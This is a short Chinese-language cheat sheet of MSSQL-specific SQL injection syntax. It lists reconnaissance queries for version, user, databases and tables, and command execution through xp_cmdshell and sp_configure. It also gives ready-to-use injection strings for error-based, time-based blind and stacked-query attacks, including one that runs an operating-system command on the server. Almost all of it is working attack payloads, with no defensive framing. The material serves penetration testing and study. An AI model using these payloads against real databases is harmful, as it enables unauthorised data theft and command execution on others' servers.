# MSSQL 特定语法参考

## 信息收集

```sql
-- 版本
SELECT @@version

-- 当前用户
SELECT user_name()
SELECT system_user

-- 当前数据库
SELECT db_name()

-- 所有数据库
SELECT name FROM master..sysdatabases

-- 所有表
SELECT name FROM sysobjects WHERE xtype='U'
```

## 命令执行

```sql
EXEC xp_cmdshell 'whoami'
EXEC sp_configure 'show advanced options',1; RECONFIGURE
```

## 报错注入

```sql
' AND 1=CONVERT(INT,(SELECT @@version))--
```

## 时间盲注

```sql
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

## 堆叠查询

```sql
'; EXEC xp_cmdshell 'whoami'--
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--
```
